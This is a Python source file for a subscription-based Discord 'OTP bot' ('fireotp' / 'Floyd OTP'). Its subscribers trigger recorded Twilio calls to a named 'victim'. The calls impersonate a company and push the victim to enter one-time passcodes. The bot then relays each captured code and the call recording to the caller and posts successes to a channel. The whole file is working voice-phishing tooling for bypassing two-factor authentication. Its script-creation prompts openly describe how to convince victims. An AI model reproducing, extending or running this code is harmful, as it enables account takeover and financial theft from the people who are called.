import secrets
import string
import discord
from discord.ext import commands
import os
from datetime import datetime, timedelta, date
import json
from dateutil.relativedelta import relativedelta
import random
from twilio.rest import Client
import time
import os
import json
import threading
import requests
import asyncio

os.system('title fireotp bot')
activity = discord.Game(name=".help")
client_d = commands.Bot(command_prefix='.', pass_context=True, case_insensitive=True, help_command=None,
                        activity=activity)

if not 'User_db' in os.listdir():
    os.mkdir('User_db')
if not 'Plans' in os.listdir('User_db'):
    os.mkdir('User_db/Plans')
if not 'Purchase History' in os.listdir('User_db'):
    os.mkdir('User_db/Purchase History')
if not 'Extra' in os.listdir():
    os.mkdir('Extra')
if not 'Config.txt' in os.listdir():
    open('Config.txt', 'w').write(
        '{"account_sid":"", "auth_token":"", "Twilio Phone Number":[], "ngrok_url":"https://example.ngrok.io", "bot_token":"", "private_category_id":"", "Balance_channel":"", "Success_Channel":"", "User_ID":[], "Member_Name":"", "Customer_Name":""}')
if not 'Extra' in os.listdir():
    os.mkdir('Extra')
if not 'user_db_otp' in os.listdir('Extra'):
    os.mkdir('Extra/user_db_otp')
if not 'user_queue' in os.listdir('Extra'):
    open(f'Extra/user_queue', 'w').close()
if not 'temp' in os.listdir():
    os.mkdir('temp')
if not 'key.txt' in os.listdir('temp'):
    open(f'temp/key.txt', 'w').close()
if not 'script' in os.listdir():
    os.mkdir('script')
if not '1 otp' in os.listdir('script'):
    os.mkdir('script/1 otp')
if not '2 otp' in os.listdir('script'):
    os.mkdir('2 otp')
if not 'private' in os.listdir('script'):
    os.mkdir('script/private')
if not '1 otp' in os.listdir('script/private'):
    os.mkdir('script/private/1 otp')
if not '2 otp' in os.listdir('script/private'):
    os.mkdir('script/private/2 otp')

raw_config = json.loads(open('Config.txt', 'r').read())

account_sid = raw_config['account_sid']
auth_token = raw_config['auth_token']
your_twilio_phone_number = raw_config['Twilio Phone Number']
ngrok = raw_config['ngrok_url']
client = Client(account_sid, auth_token)
private_category = raw_config['private_category_id']
balance_channel = raw_config['Balance_channel']
success_channel = raw_config['Success_channel']
member = raw_config['Member_Name']
customer = raw_config['Customer_Name']


async def abc(sid, id):
    a = 0
    b = 0
    c = 0
    while True:
        if client.calls(sid).fetch().status == 'queued':
            if not a >= 1:
                open(f'Extra/user_db_otp/{id}/status1.txt', 'w').write('Queued')
                a = a + 1
        elif client.calls(sid).fetch().status == 'ringing':
            if not b >= 1:
                open(f'Extra/user_db_otp/{id}/status1.txt', 'w').write('Ringing')
                b = b + 1
        elif client.calls(sid).fetch().status == 'in-progress':
            if not c >= 1:
                open(f'Extra/user_db_otp/{id}/status1.txt', 'w').write('In Progress')
                c = c + 1
        elif client.calls(sid).fetch().status == 'completed':
            open(f'Extra/user_db_otp/{id}/status1.txt', 'w').write('Completed')
            break
        elif client.calls(sid).fetch().status == 'failed':
            open(f'Extra/user_db_otp/{id}/status1.txt', 'w').write('Failed')
            break
        elif client.calls(sid).fetch().status == 'no-answer':
            open(f'Extra/user_db_otp/{id}/status1.txt', 'w').write('No Answer')
            break
        elif client.calls(sid).fetch().status == 'canceled':
            open(f'Extra/user_db_otp/{id}/status1.txt', 'w').write('Canceled')
            break
        elif client.calls(sid).fetch().status == 'busy':
            open(f'Extra/user_db_otp/{id}/status1.txt', 'w').write('Busy')
            break
        await asyncio.sleep(1)

async def cc(ctx):
    limit = 0
    while True:
        me_3 = open(f'Extra/user_db_otp/{ctx.author.id}/recording.txt', 'r').read()
        if me_3 != '':
            embed = discord.Embed(title='', description=f'Downloading Recording',
                                  color=discord.Colour.green())
            message = await ctx.send(embed=embed)

            doc = requests.get(me_3.split(' - ')[0])
            with open(f'Extra/user_db_otp/{ctx.author.id}/recording.mp3', 'wb') as f:
                f.write(doc.content)
                f.close()

            embed = discord.Embed(title='', description=f'Sending Recording',
                                  color=discord.Colour.green())
            await message.edit(embed=embed)
            await ctx.send(file=discord.File(f'Extra/user_db_otp/{ctx.author.id}/recording.mp3'))
            await message.delete()
            await asyncio.sleep(1)
            client.recordings(me_3.split(' - ')[1]).delete()
            open(f'Extra/user_db_otp/{ctx.author.id}/status.txt', 'w').close()
            open(f'Extra/user_db_otp/{ctx.author.id}/status1.txt', 'w').close()
            open(f'Extra/user_db_otp/{ctx.author.id}/recording.txt', 'w').close()
            open(f'Extra/user_db_otp/{ctx.author.id}/otp.txt', 'w').close()
            open(f'Extra/user_db_otp/{ctx.author.id}/Name.txt', 'w').close()
            open(f'Extra/user_db_otp/{ctx.author.id}/Digits.txt', 'w').close()
            open(f'Extra/user_db_otp/{ctx.author.id}/Company Name.txt', 'w').close()
            raw_queue = open('Extra/user_queue', 'r').readlines()
            open('Extra/user_queue', 'w').close()
            for e in raw_queue:
                a = e.strip('\n').split(' - ')
                id = a[0]
                sid1 = a[2]
                if not id == str(ctx.author.id):
                    open('Extra/user_queue', 'a').write(e)
            break
        elif limit > 60:
            await asyncio.sleep(1)
            open(f'Extra/user_db_otp/{ctx.author.id}/status.txt', 'w').close()
            open(f'Extra/user_db_otp/{ctx.author.id}/status1.txt', 'w').close()
            open(f'Extra/user_db_otp/{ctx.author.id}/recording.txt', 'w').close()
            open(f'Extra/user_db_otp/{ctx.author.id}/otp.txt', 'w').close()
            open(f'Extra/user_db_otp/{ctx.author.id}/Name.txt', 'w').close()
            open(f'Extra/user_db_otp/{ctx.author.id}/Digits.txt', 'w').close()
            open(f'Extra/user_db_otp/{ctx.author.id}/Company Name.txt', 'w').close()
            raw_queue = open('Extra/user_queue', 'r').readlines()
            open('Extra/user_queue', 'w').close()
            for e in raw_queue:
                a = e.strip('\n').split(' - ')
                id = a[0]
                sid1 = a[2]
                if not id == str(ctx.author.id):
                    open('Extra/user_queue', 'a').write(e)
            embed = discord.Embed(title='', description=f'Cant Find Recording',
                                  color=discord.Colour.red())
            await ctx.send(embed=embed)
            break
        await asyncio.sleep(1)


async def pp(ctx, nothing):
    me = ''
    me2 = ''
    otp = ''
    color = discord.Colour.green()
    limit = 0
    while True:
        me_ = open(f'Extra/user_db_otp/{ctx.author.id}/status1.txt', 'r').read()
        if me_ != me:
            me = me_
            if me_ in ['Failed', 'No Answer', 'Canceled', 'Busy']:
                embed = discord.Embed(title='',
                                      description=f':envelope_with_arrow: OTP : {otp}\n\n:iphone: Status : {me_}\n:envelope: Extra Status : {me2}',
                                      color=discord.Colour.red())
                await nothing.edit(embed=embed)
                raw_queue = open('Extra/user_queue', 'r').readlines()
                open('Extra/user_queue', 'w').close()
                for e in raw_queue:
                    a = e.strip('\n').split(' - ')
                    id = a[0]
                    sid1 = a[2]
                    if not str(ctx.author.id) == id:
                        open('Extra/user_queue', 'a').write(e)
                open(f'Extra/user_db_otp/{ctx.author.id}/status.txt', 'w').close()
                open(f'Extra/user_db_otp/{ctx.author.id}/status1.txt', 'w').close()
                open(f'Extra/user_db_otp/{ctx.author.id}/recording.txt', 'w').close()
                open(f'Extra/user_db_otp/{ctx.author.id}/otp.txt', 'w').close()
                open(f'Extra/user_db_otp/{ctx.author.id}/Name.txt', 'w').close()
                open(f'Extra/user_db_otp/{ctx.author.id}/Digits.txt', 'w').close()
                open(f'Extra/user_db_otp/{ctx.author.id}/Company Name.txt', 'w').close()
                break
            elif me_ in ['Completed']:
                if otp == '':
                    embed = discord.Embed(title='',
                                          description=f':envelope_with_arrow: OTP : Failed\n\n:iphone: Status : {me_}\n:envelope: Extra Status : {me2}',
                                          color=discord.Colour.red())
                    await nothing.edit(embed=embed)
                    await asyncio.create_task(cc(ctx))
                    break
                else:
                    embed = discord.Embed(title='',
                                          description=f':envelope_with_arrow: OTP : {otp}\n\n:iphone: Status : {me_}\n:envelope: Extra Status : {me2}',
                                          color=discord.Colour.green())
                    await nothing.edit(embed=embed)
                    channel_ = client_d.get_channel(success_channel)
                    embed1 = discord.Embed(title='',
                                           description=f':envelope_with_arrow: OTP : {otp}\n\n:iphone: Status : {me_}\n:envelope: Extra Status : {me2}\n :spy: By : {ctx.author.name}',
                                           color=discord.Colour.green())
                    await channel_.send(embed=embed1)
                    await asyncio.create_task(cc(ctx))
                    break
            else:
                embed = discord.Embed(title='',
                                      description=f':envelope_with_arrow: OTP : {otp}\n\n:iphone: Status : {me_}\n:envelope: Extra Status : {me2}',
                                      color=discord.Colour.green())
                color = discord.Colour.green()
            await nothing.edit(embed=embed)
        me_2 = open(f'Extra/user_db_otp/{ctx.author.id}/status.txt', 'r').read()
        if me_2 != me2:
            me2 = me_2
            embed = discord.Embed(title='',
                                  description=f':envelope_with_arrow: OTP : {otp}\n\n:iphone: Status : {me_}\n:envelope: Extra Status : {me_2}',
                                  color=color)
            await nothing.edit(embed=embed)
        otp1 = open(f'Extra/user_db_otp/{ctx.author.id}/otp.txt', 'r').read()
        if otp1 != '':
            await asyncio.sleep(1)
            otp = open(f'Extra/user_db_otp/{ctx.author.id}/otp.txt', 'r').read()
            embed = discord.Embed(title='',
                                  description=f':envelope_with_arrow: OTP : {otp}\n\n:iphone: Status : {me_}\n:envelope: Extra Status : {me2}',
                                  color=discord.Colour.green())
            await nothing.edit(embed=embed)
        limit += 1
        await asyncio.sleep(1.5)


@client_d.event
async def on_ready():
    print('Bot Alive!')
    balance_c = client_d.get_channel(959446264498516018)
    balance_r = json.loads(requests.get(f'https://api.twilio.com/2010-04-01/Accounts/{account_sid}/Balance.json',
                                        auth=(account_sid, auth_token)).text)
    print(balance_r)
    balance_m = await balance_c.send(f'{balance_r["balance"]} {balance_r["currency"]}')
    while True:
        balance_r = json.loads(requests.get(f'https://api.twilio.com/2010-04-01/Accounts/{account_sid}/Balance.json',
                                            auth=(account_sid, auth_token)).text)
        await balance_m.edit(content=f'{balance_r["balance"]} {balance_r["currency"]}')
        await asyncio.sleep(5)


@client_d.command()
async def redeem(ctx, *redeem_key):
    redeem_key = list(redeem_key)
    if redeem_key == []:
        embed = discord.Embed(title='', description='.redeem <key>', color=discord.Colour.red())
        await ctx.send(embed=embed)
    else:
        status = ''
        embed = discord.Embed(title='', description='Wait For A Moment', color=discord.Colour.blue())
        message = await ctx.send(embed=embed)
        keys = open('Generated Code.txt', 'r').readlines()
        open('Generated Code.txt', 'w').close()
        for key in keys:
            raw = key.strip('\n').split(' - ')
            key_ = raw[0]
            days = int(raw[1])
            EndDate = datetime.strptime(datetime.now().strftime('%Y/%m/%d %H:%M:%S'), '%Y/%m/%d %H:%M:%S') + timedelta(
                days=days)
            if key_ == redeem_key[0]:
                if not str(ctx.author.id) in os.listdir('User_db/Plans'):
                    open(f'User_db/Plans/{ctx.author.id}', 'w').write(f'{EndDate}')
                    open(f'User_db/Purchase History/{ctx.author.id}', 'a').write(
                        f'{datetime.now().strftime("%Y/%m/%d %H:%M:%S")} - {days}\n')
                else:
                    old_expiry_date = open(f'User_db/Plans/{ctx.author.id}', 'r').read().replace('-', '/')
                    current_time = datetime.now().strftime('%Y/%m/%d %H:%M:%S')
                    start = datetime.strptime(current_time.replace('-', '/'), '%Y/%m/%d %H:%M:%S')
                    end = datetime.strptime(old_expiry_date, '%Y/%m/%d %H:%M:%S')
                    diff = relativedelta(end, start)
                    time_left = (str(diff.months) + " Month " + str(diff.days) + " days " + str(
                        diff.hours) + " hours " + str(diff.minutes) + "minutes" + str(diff.seconds) + "seconds")
                    if '-' in time_left:
                        pass
                    else:
                        EndDate = end + timedelta(days=days)
                    open(f'User_db/Plans/{ctx.author.id}', 'w').write(f'{str(EndDate)}')
                    open(f'User_db/Purchase History/{ctx.author.id}', 'a').write(
                        f'{datetime.now().strftime("%Y/%m/%d %H:%M:%S")} - {days}\n')

                if days < 7:
                    unit = 'Day'
                elif days < 30:
                    unit = 'Week'
                    days = str(days / 7).split('.')
                    days = days[0]
                elif days < 365:
                    unit = 'Month'
                    days = str(days / 30).split('.')
                    days = days[0]
                else:
                    days = 'Lifetime'
                    unit = ''
                embed = discord.Embed(title='', description=f'Success. Redeemed {days} {unit}',
                                      color=discord.Colour.green())
                status = 'redeem'
            else:
                open('Generated Code.txt', 'a').write(f'{key_} - {days}\n')
        if status == 'redeem':
            await message.edit(embed=embed)
            category = discord.utils.get(ctx.guild.categories, id=private_category)
            channel = await ctx.guild.create_text_channel(f'{str(ctx.author.name)}-{str((ctx.author.discriminator))}',
                                                          category=category)
            await channel.set_permissions(ctx.author, send_messages=True, read_messages=True)
            await channel.set_permissions(discord.utils.get(ctx.guild.roles, name=customer), send_messages=False,
                                          read_messages=False)
            await channel.set_permissions(discord.utils.get(ctx.guild.roles, name=member), send_messages=False,
                                          read_messages=False)
            await channel.set_permissions(ctx.guild.default_role, send_messages=False, read_messages=False)
            await channel.send(ctx.author.mention)
            role = discord.utils.get(ctx.author.guild.roles, name=customer)
            await ctx.author.add_roles(role)
        else:
            embed = discord.Embed(title='', description=f'Invalid Key', color=discord.Colour.red())
            await message.edit(embed=embed)


@client_d.command()
async def plan(ctx, *user):
    user = list(user)
    if user == []:
        user = str(ctx.author.id)
    else:
        user = user[0]
    user = user.strip('<@!').strip('>')
    embed = discord.Embed(title='', description='Wait For A Moment', color=discord.Colour.blue())
    message = await ctx.send(embed=embed)
    random_code = 'check_plan-' + ''.join(
        secrets.choice(string.ascii_lowercase + string.digits + string.ascii_uppercase) for i in range(15))
    if not user in os.listdir('User_db/Purchase History'):
        purchase = 'None'
    else:
        raw_ = open(f'User_db/Purchase History/{user}', 'r')
        raw = raw_.readlines()
        raw_.close()
        del raw_
        count = 0
        for e in reversed(raw):
            count += 1
            if count <= 10:
                open(f'temp/{random_code}', 'a').write(e)

        purchase_ = open(f'temp/{random_code}', 'r')
        purchase = purchase_.read()
        purchase_.close()
    if not user in os.listdir('User_db/Plans'):
        expiry_date = 'No Active Sub'
        isactive = 'False'
    else:
        old_expiry_date = open(f'User_db/Plans/{user}', 'r').read().replace('-', '/')
        if old_expiry_date == '':
            embed = discord.Embed(title='', description='', color=discord.Colour.blue())
            embed.add_field(name=f'Expiry Date', value='No Active Sub', inline=True)
            embed.add_field(name=f'Active Sub', value='False', inline=True)
            embed.add_field(name=f'10 Latest Purchase History', value='None', inline=False)
            await message.edit(embed=embed)
            return
        current_time = datetime.now().strftime('%Y/%m/%d %H:%M:%S')
        start = datetime.strptime(current_time, '%Y/%m/%d %H:%M:%S')
        end = datetime.strptime(old_expiry_date, '%Y/%m/%d %H:%M:%S')
        diff = relativedelta(end, start)
        time_left = (str(diff.months) + " Month " + str(diff.days) + " days " + str(diff.hours) + " hours " + str(
            diff.minutes) + "minutes" + str(diff.seconds) + "seconds")
        if '-' in time_left:
            expiry_date = 'No Active Sub'
            isactive = 'False'
        else:
            expiry_date = open(f'User_db/Plans/{user}', 'r').read()
            isactive = 'True'
    embed = discord.Embed(title='', description='', color=discord.Colour.blue())
    embed.add_field(name=f'Expiry Date', value=expiry_date, inline=True)
    embed.add_field(name=f'Active Sub', value=isactive, inline=True)
    embed.add_field(name=f'10 Latest Purchase History', value=purchase, inline=False)
    await message.edit(embed=embed)


@client_d.command()
@commands.has_any_role('Owner', customer)
async def custom_modules(ctx):
    if not str(ctx.auhtor.id) in os.listdir(f'script/private'):
        embed = discord.Embed(title='', description='You Dont Have Any Custom Script Yet. `.create` to create custom script',
                              color=discord.Colour.light_grey())
        await ctx.send(embed=embed)
    else:
        random_code1 = 'module-' + ''.join(
            secrets.choice(string.ascii_lowercase + string.digits + string.ascii_uppercase) for i in range(15))
        random_code2 = 'module-' + ''.join(
            secrets.choice(string.ascii_lowercase + string.digits + string.ascii_uppercase) for i in range(15))
        try:
            for e in os.listdir(f'script/private/{ctx.author.id}/1 otp'):
                open(f'temp/{random_code1}', 'a').write(f'{e}\n')
            for e in os.listdir(f'script/private/{ctx.author.id}/2 otp'):
                open(f'temp/{random_code2}', 'a').write(f'{e}\n')

            embed = discord.Embed(title='Floyd OTP',
                                  description='',
                                  color=discord.Colour.light_grey())
            embed.add_field(name="1 OTP Requests", value=open(f'temp/{random_code1}').read(), inline=True)
            embed.add_field(name="2 OTP Requests", value=open(f'temp/{random_code2}').read(), inline=True)
            await ctx.send(embed=embed)
        except:
            embed = discord.Embed(title='',
                                  description='You Dont Have Any Custom Script Yet. `.create` to create custom script',
                                  color=discord.Colour.light_grey())
            await ctx.send(embed=embed)

@client_d.command()
@commands.has_any_role('Owner', customer)
async def create(ctx, *content):
    content = list(content)
    if content == []:
        await ctx.send('.create `<Name For Your Custom Module> <1 or 2 for otp requests> <otp length example: 6 - 4>`')
    else:
        if len(content) != 3:
            await ctx.send('.create `<Name For Your Custom Module> <1 or 2 for otp requests> <otp length, example for type 2: 6 - 4, type 1: 6>`')
        else:
            name = content[0]
            type_ = content[1]
            try:
                type_ = int(type_)
                if not type_ in [1, 2]:
                    await ctx.send('only 1/2')
            except:
                await ctx.send('Only Digits')
            digit = content[2]
            try:
                if type_ == 1:
                    digit = int(digit)
                    if digit >= 15:
                        await ctx.send('Max limit for otp is 15')
                        return
                elif type_ == 2:
                    if not ' - ' in digit:
                        await ctx.send('Make Sure There - in the type 2 otp length to split it')
                        return
                    else:
                        if digit.split(' - ') != 2:
                            await ctx.send('Make There are 2 numbers lol')
            except:
                await ctx.send('Only Digits For Length of Otp Code')

            await ctx.send('There Will Be 6 Lines That You Need To Add')
            channel = ctx.channel
            await channel.send('type cancel to to cancel this process, timeout = 30 sec')
            await channel.send(
                'Line1: Type Anything this gonna be the first thing that the otp bot gonna say.\n{Name} = Victim Name')

            def check(m):
                return m.content and m.channel == channel

            msg = await client_d.wait_for('message', check=check, timeout=30)
            if msg.content.lower == 'cancel':
                await channel.send('Cancelled')
                return
            await channel.send(f'Line2: This gonna be like press 1 to continue this call or something similar')
            msg1 = await client_d.wait_for('message', check=check, timeout=30)
            if msg.content.lower == 'cancel':
                await channel.send('Cancelled')
                return
            await channel.send(
                'Line3: and this gonna be like please dial digits code and shit to convice victim to type their code\n{Digits} = the ot length')
            msg2 = await client_d.wait_for('message', check=check, timeout=30)
            if msg.content.lower == 'cancel':
                await channel.send('Cancelled')
                return
            await channel.send('Line4: this gonna be after u gathered otp code.and if otp type is 2 this gonna be for asking for second code ig')
            msg3 = await client_d.wait_for('message', check=check, timeout=30)
            if msg.content.lower == 'cancel':
                await channel.send('Cancelled')
                return
            msg = msg.content.strip('\"\'')
            msg1 = msg1.content.strip('\"\'')
            msg2 = msg2.content.strip('\"\'')
            msg3 = msg3.content.strip('\"\'')
            if str(type_) == '1':
                file_type = '1 otp'
                try:
                    if str(ctx.author.id) in os.listdir('script/private'):
                        os.mkdir(f'script/private/{str(ctx.author.id)}')
                        os.mkdir(f'script/private/{str(ctx.author.id)}/1 otp')
                        os.mkdir(f'script/private/{str(ctx.author.id)}/2 otp')
                    open(f'script/private/{ctx.author.id}/{file_type}/{name}', 'w').write(
                        f'\f\"{msg}\" - \f\"{msg1}\" - \f\"{msg2}\" - \f\"{msg3}\" : {digit}')
                except:
                    await ctx.send('Some Errors')
                    return
            elif str(type_) == '2':
                await channel.send('Line5: this gonna be after u gathered otp code')
                msg4 = await client_d.wait_for('message', check=check, timeout=30)
                if msg.content.lower == 'cancel':
                    await channel.send('Cancelled')
                    return
                file_type = '2 otp'
                msg4 = msg4.content.strip('\"\'')
                try:
                    if str(ctx.author.id) in os.listdir('script/private'):
                        os.mkdir(f'script/private/{str(ctx.author.id)}')
                        os.mkdir(f'script/private/{str(ctx.author.id)}/1 otp')
                        os.mkdir(f'script/private/{str(ctx.author.id)}/2 otp')
                    open(f'script/private/{ctx.author.id}/{file_type}/{name}', 'w').write(
                        f'\f\"{msg}\" - \f\"{msg1}\" - \f\"{msg2}\" - \f\"{msg3}\" - \f\"{msg4}\" : {digit}')
                except:
                    await ctx.send('Some Errors')
                    return


            await ctx.send('Done')

@client_d.command()
@commands.has_any_role('Owner', customer)
async def custom(ctx, *content):
    if not str(ctx.author.id) in os.listdir('User_db/Plans'):
        embed = discord.Embed(title='', description='You Dont Have Active Sub',
                              color=discord.Colour.red())
        await ctx.send(embed=embed)
        return
    else:
        old_expiry_date = open(f'User_db/Plans/{ctx.author.id}', 'r').read().replace('-', '/')
        current_time = datetime.now().strftime('%Y/%m/%d %H:%M:%S')
        start = datetime.strptime(current_time, '%Y/%m/%d %H:%M:%S')
        end = datetime.strptime(old_expiry_date, '%Y/%m/%d %H:%M:%S')
        diff = relativedelta(end, start)
        time_left = (str(diff.months) + " Month " + str(diff.days) + " days " + str(diff.hours) + " hours " + str(
            diff.minutes) + "minutes" + str(diff.seconds) + "seconds")
        if '-' in time_left:
            embed = discord.Embed(title='', description='You Dont Have Active Sub',
                                  color=discord.Colour.red())
            await ctx.send(embed=embed)
            return
        else:
            content = list(content)
            if content == []:
                await ctx.send('.call `<Phone Number> <Victim\'s Name> <Module> <1/2 otp requests>`')
            else:
                if len(content) != 3:
                    await ctx.send('.call `<Phone Number> <Victim\'s Name> <Module> <1/2 otp requests>`')
                else:
                    phone = content[0].strip('\u200e')
                    name = content[1].strip('\u200e')
                    module = content[2].strip('\u200e')
                    type_ = content[3].strip('\u200e')
                    try:
                        type_ = int(type_)
                        if not type_ in [1, 2]:
                            await ctx.send('Only available type is 1 or 2')
                            return
                    except:
                        await ctx.send('Only Digits')
                        return
                    if not module in os.listdir(f'script/private/{ctx.author.id}/{type_} otp'):
                        await ctx.send('Cant find the module')
                        return
                    embed = discord.Embed(title='',
                                          description=f':envelope_with_arrow: OTP : \n:envelope_with_arrow: OTP2 : \n\n:iphone: Status : Pending \n:envelope: Extra Status : ',
                                          color=discord.Colour.blue())
                    nothing = await ctx.send(embed=embed)
                    if not str(ctx.author.id) in os.listdir('Extra/user_db_otp'):
                        os.mkdir(f'Extra/user_db_otp/{ctx.author.id}')
                    raw_queue = open('Extra/user_queue', 'r').readlines()
                    for e in raw_queue:
                        try:
                            if phone in e.split(' - ')[1]:
                                embed = discord.Embed(title='',
                                                      description=f':envelope_with_arrow: OTP : \n:envelope_with_arrow: OTP2 : \n\n:iphone: Status : Incomplete Process/Call \n:envelope: Extra Status : ',
                                                      color=discord.Colour.red())
                                await nothing.edit(embed=embed)
                                return
                            elif str(ctx.author.id) == e.split(' - ')[0]:
                                embed = discord.Embed(title='',
                                                      description=f':envelope_with_arrow: OTP : \n:envelope_with_arrow: OTP2 : \n\n:iphone: Status : Incomplete Process/Call\n:envelope: Extra Status : ',
                                                      color=discord.Colour.red())
                                await nothing.edit(embed=embed)
                                return
                        except:
                            pass
                    open(f'Extra/user_db_otp/{ctx.author.id}/Name.txt', 'w').write(f'{name}')
                    open(f'Extra/user_db_otp/{ctx.author.id}/otp.txt', 'w').close()
                    open(f'Extra/user_db_otp/{ctx.author.id}/otp1.txt', 'w').close()
                    open(f'Extra/user_db_otp/{ctx.author.id}/status.txt', 'w').close()
                    open(f'Extra/user_db_otp/{ctx.author.id}/status1.txt', 'w').close()
                    open(f'Extra/user_db_otp/{ctx.author.id}/recording.txt', 'w').close()
                    call = client.calls.create(
                        url=f'{ngrok}/voicecustom',
                        to=f'{phone}',
                        from_=f'{str(random.choice(your_twilio_phone_number))}',
                        record=True,
                        recording_status_callback=f'{ngrok}/status_fallback'
                    )
                    sid = call.sid
                    open('Extra/user_queue', 'a').write(f'{ctx.author.id} - {phone} - {sid} - {module} - {type_}\n')
                    task = asyncio.create_task(abc(sid=sid, id=str(ctx.author.id)))
                    await asyncio.create_task(pp(ctx, nothing))
                    await asyncio.sleep(1)
                    open(f'Extra/user_db_otp/{ctx.author.id}/otp.txt', 'w').close()
                    open(f'Extra/user_db_otp/{ctx.author.id}/otp1.txt', 'w').close()
                    open(f'Extra/user_db_otp/{ctx.author.id}/status.txt', 'w').close()
                    open(f'Extra/user_db_otp/{ctx.author.id}/status1.txt', 'w').close()


@client_d.command()
@commands.has_any_role('Owner', customer)
async def call(ctx, *content):
    c_ = client_d.get_channel(id=960467264824569866)
    await c_.send(ctx.author.mention)
    if not str(ctx.author.id) in os.listdir('User_db/Plans'):
        embed = discord.Embed(title='', description='You Dont Have Active Sub',
                              color=discord.Colour.red())
        await ctx.send(embed=embed)
        return
    else:
        old_expiry_date = open(f'User_db/Plans/{ctx.author.id}', 'r').read().replace('-', '/')
        current_time = datetime.now().strftime('%Y/%m/%d %H:%M:%S')
        start = datetime.strptime(current_time, '%Y/%m/%d %H:%M:%S')
        end = datetime.strptime(old_expiry_date, '%Y/%m/%d %H:%M:%S')
        diff = relativedelta(end, start)
        time_left = (str(diff.months) + " Month " + str(diff.days) + " days " + str(diff.hours) + " hours " + str(
            diff.minutes) + "minutes" + str(diff.seconds) + "seconds")
        if '-' in time_left:
            embed = discord.Embed(title='', description='You Dont Have Active Sub',
                                  color=discord.Colour.red())
            await ctx.send(embed=embed)
            return
        else:
            content = list(content)
            if content == []:
                await ctx.send('.call `<Phone Number> <Length Of Otp Code> <Victim\'s Name> <Company\'s Name>`')
            else:
                if len(content) != 4:
                    await ctx.send('.call `<Phone Number> <Length Of Otp Code> <Victim\'s Name> <Company\'s Name>`')
                else:
                    phone = content[0].strip('\u200e')
                    digits = content[1].strip('\u200e')
                    name = content[2].strip('\u200e')
                    companyname = content[3].strip('\u200e')
                    embed = discord.Embed(title='',
                                          description=f':envelope_with_arrow: OTP : \n\n:iphone: Status : Pending \n:envelope: Extra Status : ',
                                          color=discord.Colour.blue())
                    nothing = await ctx.send(embed=embed)
                    if not str(ctx.author.id) in os.listdir('Extra/user_db_otp'):
                        os.mkdir(f'Extra/user_db_otp/{ctx.author.id}')
                    raw_queue = open('Extra/user_queue', 'r').readlines()
                    for e in raw_queue:
                        try:
                            if phone in e.split(' - ')[1]:
                                embed = discord.Embed(title='',
                                                      description=f':envelope_with_arrow: OTP : \n\n:iphone: Status : Incomplete Process/Call \n:envelope: Extra Status : ',
                                                      color=discord.Colour.red())
                                await nothing.edit(embed=embed)
                                return
                            elif str(ctx.author.id) == e.split(' - ')[0]:
                                embed = discord.Embed(title='',
                                                      description=f':envelope_with_arrow: OTP : \n\n:iphone: Status : Incomplete Process/Call\n:envelope: Extra Status : ',
                                                      color=discord.Colour.red())
                                await nothing.edit(embed=embed)
                                return
                        except:
                            pass
                    open(f'Extra/user_db_otp/{ctx.author.id}/Digits.txt', 'w').write(f'{digits}')
                    open(f'Extra/user_db_otp/{ctx.author.id}/Name.txt', 'w').write(f'{name}')
                    open(f'Extra/user_db_otp/{ctx.author.id}/Company Name.txt', 'w').write(f'{companyname}')
                    open(f'Extra/user_db_otp/{ctx.author.id}/otp.txt', 'w').close()
                    open(f'Extra/user_db_otp/{ctx.author.id}/status.txt', 'w').close()
                    open(f'Extra/user_db_otp/{ctx.author.id}/status1.txt', 'w').close()
                    open(f'Extra/user_db_otp/{ctx.author.id}/recording.txt', 'w').close()
                    call = client.calls.create(
                        url=f'{ngrok}/voice',
                        to=f'{phone}',
                        from_=f'{str(random.choice(your_twilio_phone_number))}',
                        record=True,
                        recording_status_callback=f'{ngrok}/status_fallback'
                    )
                    sid = call.sid
                    open('Extra/user_queue', 'a').write(f'{ctx.author.id} - {phone} - {sid} - call\n')
                    task = asyncio.create_task(abc(sid=sid, id=str(ctx.author.id)))
                    await asyncio.create_task(pp(ctx, nothing))
                    await asyncio.sleep(1)
                    open(f'Extra/user_db_otp/{ctx.author.id}/otp.txt', 'w').close()
                    open(f'Extra/user_db_otp/{ctx.author.id}/status.txt', 'w').close()
                    open(f'Extra/user_db_otp/{ctx.author.id}/status1.txt', 'w').close()


@client_d.command()
async def help(ctx):
    embed = discord.Embed(title='', description='', color=discord.Colour.green())
    embed.add_field(name='Commands', value="**.redeem** `<key>`\n**.plan** `(ping or id)`", inline=True)
    embed.add_field(name='_', value="redeem sub\ncheck user's subscription", inline=True)
    await ctx.send(embed=embed)
    embed = discord.Embed(title='', description='', color=discord.Colour.green())
    embed.add_field(name='Modules',
                    value="**.call** `<Phone Number> <Lenght of Otp> <Name> <Company Name>`\n\n**.callagain** `<Phone Number> <Lenght of Otp> <Name> <Company Name>`\n\n<> Needed \n() Optional",
                    inline=True)

    embed.add_field(name='_',
                    value="Call With Custom Company Name and the lenght of the otp code\n\nCall again if you got wrong code",
                    inline=True)
    await ctx.send(embed=embed)


while True:
    print(f'{datetime.now()} - Starting')
    client_d.run(
        raw_config['bot_token']
    )
    print(f'{datetime.now()} - Crashed')